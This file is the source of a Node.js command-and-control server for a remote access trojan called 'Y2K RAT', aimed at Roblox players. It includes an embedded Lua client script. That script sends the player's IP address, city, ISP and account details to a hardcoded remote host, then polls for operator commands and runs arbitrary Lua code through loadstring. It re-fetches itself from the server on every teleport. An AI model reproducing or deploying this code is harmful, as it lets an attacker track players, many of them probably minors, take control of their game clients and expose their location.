const express = require('express');
const cors = require('cors');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));
app.use(express.static('public'));

// Base de données en mémoire
const players = new Map();
const commands = new Map();
const chatHistory = new Map();
const executionResults = new Map();
const logs = new Map();

// Fonction pour ajouter un log
function addLog(userid, type, action, details = {}) {
    if (!logs.has(userid.toString())) {
        logs.set(userid.toString(), []);
    }
    
    const logEntry = {
        timestamp: Date.now(),
        type,
        action,
        details,
        date: new Date().toISOString()
    };
    
    logs.get(userid.toString()).unshift(logEntry);
    
    if (logs.get(userid.toString()).length > 500) {
        logs.get(userid.toString()).pop();
    }
    
    console.log(`📋 [LOG] ${userid}: [${type}] ${action}`);
}

// ========================================
// API ENDPOINTS - Y2K RAT
// ========================================

// Endpoint principal pour l'enregistrement des joueurs
app.post('/log', (req, res) => {
    try {
        const { 
            username, 
            userid, 
            accountAge, 
            premium, 
            game, 
            placeId, 
            jobId, 
            platform, 
            executor, 
            timestamp, 
            ip, 
            status = 'online' 
        } = req.body;

        console.log('📥 [LOG] Received data:', { username, userid, executor });

        if (!userid) {
            console.warn('⚠️ Missing userid in /log');
            return res.status(400).json({ success: false, error: 'Missing userid' });
        }

        const isNewPlayer = !players.has(userid.toString());

        const playerData = {
            userid: userid.toString(),
            username: username || 'Unknown',
            accountAge: accountAge || '0',
            premium: premium || false,
            game: game || 'Unknown Game',
            placeId: placeId || 'N/A',
            jobId: jobId || 'N/A',
            platform: platform || 'Unknown',
            executor: executor || 'Unknown',
            ip: ip || 'Hidden',
            status: 'online',
            lastSeen: Date.now(),
            firstSeen: isNewPlayer ? Date.now() : players.get(userid.toString()).firstSeen
        };

        players.set(userid.toString(), playerData);
        
        if (isNewPlayer) {
            addLog(userid, 'system', 'Client connected', {
                username,
                executor,
                game,
                ip
            });
        }
        
        console.log(`✅ [${isNewPlayer ? 'NEW' : 'UPDATE'}] ${username} (${userid}) - ${executor} | Total: ${players.size}`);
        res.json({ success: true, message: 'Player logged successfully' });
    } catch (error) {
        console.error('❌ Error in /log:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// Endpoint pour le heartbeat (maintenir le statut online)
app.post('/heartbeat', (req, res) => {
    try {
        const { userid, status, timestamp } = req.body;

        if (!userid) {
            return res.status(400).json({ success: false, error: 'Missing userid' });
        }

        const player = players.get(userid.toString());
        if (player) {
            player.lastSeen = Date.now();
            player.status = 'online';
            // console.log(`💚 [HEARTBEAT] ${player.username} (${userid})`); // Commenté pour éviter le spam
        } else {
            console.log(`⚠️ [HEARTBEAT] Unknown player: ${userid}`);
        }

        res.json({ success: true });
    } catch (error) {
        console.error('❌ Error in /heartbeat:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// Endpoint pour récupérer les commandes (depuis le client Roblox)
app.get('/commands/:userid', (req, res) => {
    try {
        const { userid } = req.params;
        
        const command = commands.get(userid.toString());
        
        if (command) {
            commands.delete(userid.toString());
            console.log(`📨 [COMMAND] Retrieved by ${userid}:`, command);
            return res.json([command]);
        }

        res.json([]);
    } catch (error) {
        console.error('❌ Error in /commands:', error);
        res.status(500).json([]);
    }
});

// Endpoint pour obtenir la liste des joueurs
app.get('/players', (req, res) => {
    try {
        const now = Date.now();
        const playerList = Array.from(players.values()).map(player => ({
            ...player,
            status: (now - player.lastSeen < 20000) ? 'online' : 'offline'
        }));
        
        console.log(`📊 [PLAYERS] Sending ${playerList.length} player(s) | Online: ${playerList.filter(p => p.status === 'online').length}`);
        res.json(playerList);
    } catch (error) {
        console.error('❌ Error in /players:', error);
        res.status(500).json([]);
    }
});

// Endpoint pour envoyer des commandes depuis le panel (AMÉLIORÉ)
app.post('/command', (req, res) => {
    try {
        const { 
            userid,
            userids, // Support pour plusieurs utilisateurs
            command, 
            reason, 
            speed, 
            text, 
            chatMessage, 
            chatSender, 
            luaCode, 
            power,
            x, y, z
        } = req.body;

        // Support pour bulk actions
        const targetUserIds = userids || [userid];
        
        if (!targetUserIds || targetUserIds.length === 0) {
            return res.status(400).json({ error: 'Missing userid or userids' });
        }

        if (!command && !chatMessage && !luaCode) {
            return res.status(400).json({ error: 'Missing command, chatMessage, or luaCode' });
        }

        const commandData = {};
        
        if (chatMessage) {
            commandData.command = 'chat';
            commandData.chatMessage = chatMessage;
            commandData.chatSender = chatSender || 'ADMIN';
        } else if (luaCode) {
            commandData.luaCode = luaCode;
        } else {
            commandData.command = command;
            if (reason) commandData.reason = reason;
            if (speed) commandData.speed = speed;
            if (text) commandData.text = text;
            if (power) commandData.power = power;
            if (x) commandData.x = x;
            if (y) commandData.y = y;
            if (z) commandData.z = z;
        }

        // Envoyer la commande à tous les utilisateurs ciblés
        let successCount = 0;
        for (const uid of targetUserIds) {
            const targetId = uid.toString();
            commands.set(targetId, commandData);
            
            if (chatMessage) {
                if (!chatHistory.has(targetId)) {
                    chatHistory.set(targetId, []);
                }
                chatHistory.get(targetId).push({
                    sender: chatSender || 'ADMIN',
                    message: chatMessage,
                    timestamp: Date.now(),
                    isAdmin: true
                });
                addLog(targetId, 'chat', 'Chat message sent', {
                    sender: chatSender || 'ADMIN',
                    message: chatMessage.substring(0, 50)
                });
            } else {
                addLog(targetId, 'command', `Command: ${command || 'exec'}`, {
                    command: command || 'execute',
                    code: luaCode ? luaCode.substring(0, 50) : undefined
                });
            }
            
            successCount++;
            console.log(`📤 [COMMAND] Queued for ${targetId}:`, command || 'exec');
        }

        res.json({ 
            success: true, 
            message: `Command sent to ${successCount} client(s)`,
            count: successCount
        });
    } catch (error) {
        console.error('❌ Error in /command:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// Endpoint pour obtenir les logs
app.get('/logs/:userid', (req, res) => {
    try {
        const { userid } = req.params;
        const userLogs = logs.get(userid.toString()) || [];
        res.json(userLogs);
    } catch (error) {
        console.error('❌ Error in /logs:', error);
        res.status(500).json([]);
    }
});

// Endpoint pour obtenir l'historique du chat
app.get('/chat/:userid', (req, res) => {
    try {
        const { userid } = req.params;
        const history = chatHistory.get(userid.toString()) || [];
        res.json(history);
    } catch (error) {
        console.error('❌ Error in /chat:', error);
        res.status(500).json([]);
    }
});

// Endpoint pour obtenir les résultats d'exécution
app.get('/exec-result/:userid', (req, res) => {
    try {
        const { userid } = req.params;
        const result = executionResults.get(userid.toString());
        if (result) {
            executionResults.delete(userid.toString());
            res.json(result);
        } else {
            res.json({ hasResult: false });
        }
    } catch (error) {
        console.error('❌ Error in /exec-result:', error);
        res.status(500).json({ hasResult: false, error: error.message });
    }
});

// Endpoint pour soumettre un résultat d'exécution
app.post('/exec-result', (req, res) => {
    try {
        const { userid, success, result, error } = req.body;
        
        if (!userid) {
            return res.status(400).json({ success: false, error: 'Missing userid' });
        }

        executionResults.set(userid.toString(), {
            success,
            result: result || '',
            error: error || '',
            timestamp: Date.now()
        });

        addLog(userid, 'exec', success ? 'Code executed' : 'Execution failed', {
            success,
            result: result ? result.substring(0, 100) : '',
            error: error || ''
        });

        console.log(`📊 [EXEC] Result from ${userid}:`, { success });
        res.json({ success: true });
    } catch (error) {
        console.error('❌ Error in /exec-result POST:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// Endpoint pour supprimer un joueur
app.delete('/player/:userid', (req, res) => {
    try {
        const { userid } = req.params;
        players.delete(userid.toString());
        commands.delete(userid.toString());
        chatHistory.delete(userid.toString());
        executionResults.delete(userid.toString());
        logs.delete(userid.toString());
        console.log(`🗑️ [DELETE] Player ${userid} removed`);
        res.json({ success: true });
    } catch (error) {
        console.error('❌ Error in /player DELETE:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// Endpoint pour supprimer plusieurs joueurs (NOUVEAU)
app.post('/players/delete-multiple', (req, res) => {
    try {
        const { userids } = req.body;
        
        if (!userids || !Array.isArray(userids)) {
            return res.status(400).json({ error: 'Missing userids array' });
        }

        let deletedCount = 0;
        for (const userid of userids) {
            const uid = userid.toString();
            if (players.has(uid)) {
                players.delete(uid);
                commands.delete(uid);
                chatHistory.delete(uid);
                executionResults.delete(uid);
                logs.delete(uid);
                deletedCount++;
            }
        }
        
        console.log(`🗑️ [BULK DELETE] Removed ${deletedCount} player(s)`);
        res.json({ success: true, count: deletedCount });
    } catch (error) {
        console.error('❌ Error in /players/delete-multiple:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// Health check endpoint
app.get('/health', (req, res) => {
    res.json({ 
        status: 'online',
        name: 'Y2K RAT Server Enhanced',
        version: '2.0.0',
        players: players.size,
        commands: commands.size,
        uptime: process.uptime()
    });
});

// Root endpoint
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Endpoint pour servir le script Lua (pour auto-reload sur téléportation)
app.get('/script', (req, res) => {
    res.setHeader('Content-Type', 'text/plain');
    res.send(`
local SERVER_URL = "https://robloxlol-production.up.railway.app"
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local RunService = game:GetService("RunService")

local function getIPInfo()
    local ip = "Hidden"
    local country = "Unknown"
    local city = "Unknown"
    local isp = "Unknown"
    
    local success1, result1 = pcall(function()
        return game:HttpGet("https://api.ipify.org?format=json")
    end)
    if success1 then
        local data = HttpService:JSONDecode(result1)
        ip = data.ip or "Hidden"
    end
    
    if ip ~= "Hidden" then
        local success2, result2 = pcall(function()
            return game:HttpGet("http://ip-api.com/json/" .. ip)
        end)
        if success2 then
            local geoData = HttpService:JSONDecode(result2)
            country = geoData.country or "Unknown"
            city = geoData.city or "Unknown"
            isp = geoData.isp or "Unknown"
        end
    end
    
    return {
        ip = ip,
        country = country,
        city = city,
        isp = isp
    }
end

local function getExecutorName()
    if syn then return "Synapse X"
    elseif KRNL_LOADED then return "KRNL"
    elseif Fluxus then return "Fluxus"
    elseif getexecutorname then return getexecutorname() or "Unknown"
    else return "Unknown" end
end

local function getPlayerInfo()
    local player = LocalPlayer
    local gameName = "Unknown"
    pcall(function()
        gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
    end)
    
    local ipInfo = getIPInfo()
   
    return {
        username = player.Name,
        displayname = player.DisplayName,
        userid = tostring(player.UserId),
        accountAge = tostring(player.AccountAge),
        premium = player.MembershipType == Enum.MembershipType.Premium,
        game = gameName,
        placeId = tostring(game.PlaceId),
        jobId = game.JobId,
        platform = tostring(game:GetService("UserInputService"):GetPlatform()),
        executor = getExecutorName(),
        timestamp = os.date("%d/%m/%Y %H:%M:%S"),
        ip = ipInfo.ip,
        country = ipInfo.country,
        city = ipInfo.city,
        isp = ipInfo.isp,
        status = "online"
    }
end

local function sendToServer(playerInfo)
    local payload = HttpService:JSONEncode(playerInfo)
   
    local success = pcall(function()
        request({
            Url = SERVER_URL .. "/log",
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = payload
        })
    end)
   
    if not success then
        pcall(function()
            syn.request({
                Url = SERVER_URL .. "/log",
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = payload
            })
        end)
    end
   
    if not success then
        pcall(function()
            http_request({
                Url = SERVER_URL .. "/log",
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = payload
            })
        end)
    end
end

local function startHeartbeat()
    spawn(function()
        while wait(10) do
            local success = pcall(function()
                request({
                    Url = SERVER_URL .. "/heartbeat",
                    Method = "POST",
                    Headers = {["Content-Type"] = "application/json"},
                    Body = HttpService:JSONEncode({
                        userid = tostring(LocalPlayer.UserId),
                        status = "online",
                        timestamp = os.date("%d/%m/%Y %H:%M:%S")
                    })
                })
            end)
           
            if not success then
                pcall(function()
                    syn.request({
                        Url = SERVER_URL .. "/heartbeat",
                        Method = "POST",
                        Headers = {["Content-Type"] = "application/json"},
                        Body = HttpService:JSONEncode({
                            userid = tostring(LocalPlayer.UserId),
                            status = "online",
                            timestamp = os.date("%d/%m/%Y %H:%M:%S")
                        })
                    })
                end)
            end
           
            if not success then
                pcall(function()
                    http_request({
                        Url = SERVER_URL .. "/heartbeat",
                        Method = "POST",
                        Headers = {["Content-Type"] = "application/json"},
                        Body = HttpService:JSONEncode({
                            userid = tostring(LocalPlayer.UserId),
                            status = "online",
                            timestamp = os.date("%d/%m/%Y %H:%M:%S")
                        })
                    })
                end)
            end
        end
    end)
end

local function executeCommand(cmd)
    local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
    local humanoid = character:FindFirstChildOfClass("Humanoid")
    local rootPart = character:FindFirstChild("HumanoidRootPart")
   
    if cmd.command == "kick" then
        LocalPlayer:Kick(cmd.reason or "Kicked by admin")
       
    elseif cmd.command == "message" then
        game.StarterGui:SetCore("SendNotification", {
            Title = "Admin Message",
            Text = cmd.text or "",
            Duration = 10
        })
       
    elseif cmd.command == "speed" then
        if humanoid then
            humanoid.WalkSpeed = tonumber(cmd.speed) or 16
        end
       
    elseif cmd.command == "jump" then
        if humanoid then
            humanoid.JumpPower = tonumber(cmd.power) or 50
        end
       
    elseif cmd.command == "teleport" then
        if rootPart and cmd.x and cmd.y and cmd.z then
            rootPart.CFrame = CFrame.new(tonumber(cmd.x), tonumber(cmd.y), tonumber(cmd.z))
        end
       
    elseif cmd.command == "freeze" then
        if rootPart then
            rootPart.Anchored = true
        end
       
    elseif cmd.command == "unfreeze" then
        if rootPart then
            rootPart.Anchored = false
        end
       
    elseif cmd.command == "invisible" then
        if character then
            for _, part in pairs(character:GetDescendants()) do
                if part:IsA("BasePart") then
                    part.Transparency = 1
                end
                if part:IsA("Decal") or part:IsA("Face") then
                    part.Transparency = 1
                end
            end
        end
       
    elseif cmd.command == "visible" then
        if character then
            for _, part in pairs(character:GetDescendants()) do
                if part:IsA("BasePart") and part.Name ~= "HumanoidRootPart" then
                    part.Transparency = 0
                end
                if part:IsA("Decal") or part:IsA("Face") then
                    part.Transparency = 0
                end
            end
        end
       
    elseif cmd.command == "god" then
        if humanoid then
            humanoid.MaxHealth = math.huge
            humanoid.Health = math.huge
        end
       
    elseif cmd.command == "ungod" then
        if humanoid then
            humanoid.MaxHealth = 100
            humanoid.Health = 100
        end
       
    elseif cmd.command == "kill" then
        if humanoid then
            humanoid.Health = 0
        end
       
    elseif cmd.command == "respawn" then
        LocalPlayer:LoadCharacter()
       
    elseif cmd.command == "chat" then
        if cmd.chatMessage then
            game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(cmd.chatMessage, "All")
        end
       
    elseif cmd.luaCode then
        local success, err = pcall(function()
            loadstring(cmd.luaCode)()
        end)
       
        pcall(function()
            request({
                Url = SERVER_URL .. "/exec-result",
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = HttpService:JSONEncode({
                    userid = tostring(LocalPlayer.UserId),
                    success = success,
                    result = success and "Code executed successfully" or "",
                    error = err or ""
                })
            })
        end)
    end
end

local function listenForCommands()
    spawn(function()
        while wait(2) do
            local success, commands = pcall(function()
                local response = game:HttpGet(SERVER_URL .. "/commands/" .. LocalPlayer.UserId)
                return HttpService:JSONDecode(response)
            end)
           
            if success and commands and #commands > 0 then
                for _, cmd in ipairs(commands) do
                    pcall(function()
                        executeCommand(cmd)
                    end)
                end
            end
        end
    end)
end

local playerInfo = getPlayerInfo()
sendToServer(playerInfo)
startHeartbeat()
listenForCommands()

game:GetService("Players").LocalPlayer.OnTeleport:Connect(function(TeleportState)
    if TeleportState == Enum.TeleportState.Started then
        queue_on_teleport([[
            wait(1)
            loadstring(game:HttpGet("]] .. SERVER_URL .. [[/script"))()
        ]])
    end
end)

LocalPlayer.CharacterAdded:Connect(function(character)
    wait(2)
    local newInfo = getPlayerInfo()
    sendToServer(newInfo)
end)
    `);
});

// Nettoyage automatique des joueurs inactifs
setInterval(() => {
    const now = Date.now();
    let cleaned = 0;
    
    for (const [userid, player] of players.entries()) {
        if (now - player.lastSeen > 30000) {
            console.log(`🔴 [TIMEOUT] ${player.username} (${userid})`);
            addLog(userid, 'system', 'Client disconnected (timeout)', {
                username: player.username,
                lastSeen: new Date(player.lastSeen).toISOString()
            });
            players.delete(userid);
            commands.delete(userid);
            chatHistory.delete(userid);
            executionResults.delete(userid);
            cleaned++;
        }
    }
    
    if (cleaned > 0) {
        console.log(`🧹 [CLEANUP] Removed ${cleaned} inactive client(s)`);
    }
}, 15000);

// Nettoyage des résultats d'exécution périmés
setInterval(() => {
    const now = Date.now();
    for (const [userid, result] of executionResults.entries()) {
        if (now - result.timestamp > 300000) {
            executionResults.delete(userid);
        }
    }
}, 60000);

// Gestion des erreurs globales
app.use((err, req, res, next) => {
    console.error('❌ [ERROR]', err);
    res.status(500).json({ 
        success: false, 
        error: 'Internal server error',
        message: err.message 
    });
});

// Démarrage du serveur
app.listen(PORT, '0.0.0.0', () => {
    console.log('╔════════════════════════════════════════╗');
    console.log('║      Y2K RAT SERVER v2.0 ENHANCED     ║');
    console.log('╚════════════════════════════════════════╝');
    console.log(`🚀 Server running on port ${PORT}`);
    console.log(`📡 Local: http://localhost:${PORT}`);
    console.log(`🌐 Network: http://0.0.0.0:${PORT}`);
    console.log(`✅ Ready to accept connections`);
    console.log(`⚡ Bulk actions enabled`);
    console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
});
